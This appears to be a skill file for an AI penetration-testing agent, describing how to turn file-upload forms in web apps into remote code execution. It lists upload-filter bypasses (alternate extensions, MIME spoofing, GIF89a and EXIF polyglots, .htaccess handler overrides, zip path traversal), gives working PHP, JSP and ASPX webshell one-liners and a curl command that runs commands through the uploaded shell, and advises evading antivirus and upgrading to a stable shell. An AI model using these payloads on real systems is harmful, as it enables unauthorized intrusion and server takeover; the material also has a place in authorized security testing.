---
name: web-upload-rce
description: File-upload abuse to code execution for web apps. Use when the app accepts a file (avatar, document, image, import, attachment) and you can influence name/type/content, or find where uploads land. Triggers - multipart upload form, avatar/profile picture, import/attachment, "invalid file type", uploaded file URL, /uploads/ path.
tags: [vuln_assess, exploitation]
---

# File Upload → RCE

## When this fires
Any upload sink (avatar, doc, image, CSV/XML import, attachment) where you control filename, content-type, or bytes — and there's a chance the upload dir is web-served or interpreted.

## Detect
1. Upload a benign file, find WHERE it lands (response URL, predictable `/uploads/<name>`, guess via ffuf).
2. Probe the filter: try `.php`, `.phtml`, `.php5`, `.phar`, `.jsp`, `.aspx` — note what's rejected and HOW (extension vs MIME vs magic-byte vs content-scan).

## Decide — which bypass
- **Extension blocklist** → `.phtml`/`.php5`/`.phar`/`.pht`; double `shell.php.jpg`; trailing `shell.php%00.jpg` (old); case `shell.PHP`; `.php.` (Apache).
- **MIME check only** → keep `.php`, set `Content-Type: image/png`.
- **Magic-byte/content check** → prepend `GIF89a;` or valid image header, then PHP: `GIF89a;<?php system($_GET['c']); ?>`. Or embed in EXIF (`exiftool -Comment='<?php ...?>' x.jpg`).
- **Server config writable** → upload `.htaccess` (`AddType application/x-httpd-php .jpg`) then a `.jpg` webshell.
- **SVG/XML upload** → stored XSS or XXE (see web-xxe). **Zip/import** → path traversal (`../../`) to write outside the upload dir.

## Exploit → PROVE IMPACT
```bash
# minimal webshells
echo '<?php system($_GET["c"]); ?>' > shell.phtml     # PHP
# JSP: <% Runtime.getRuntime().exec(request.getParameter("c")); %>   ASPX: Process.Start("cmd","/c "+Request["c"])
curl 'http://<t>/uploads/shell.phtml?c=id'             # execute → prove
```
**Proof required:** `id`/`whoami` from the uploaded shell (RCE). Then upgrade to a stable shell / `record_artifact`; drop markers where the engagement requires.

## Tooling
`ffuf` to locate the upload dir; `exiftool` for magic-byte polyglots; `nuclei -tags fileupload`. Feed dir-discovery to `gobuster_parse`.

## False positives / pitfalls
- Upload succeeds but dir is non-executable (static/CDN) → find an interpreted path, or pivot to LFI-include of the uploaded file.
- Antivirus/content scan strips shells → try polyglot + less-common handler extension.
- Random-renamed filename → you still need the returned path; if unknown, brute or chain with LFI.
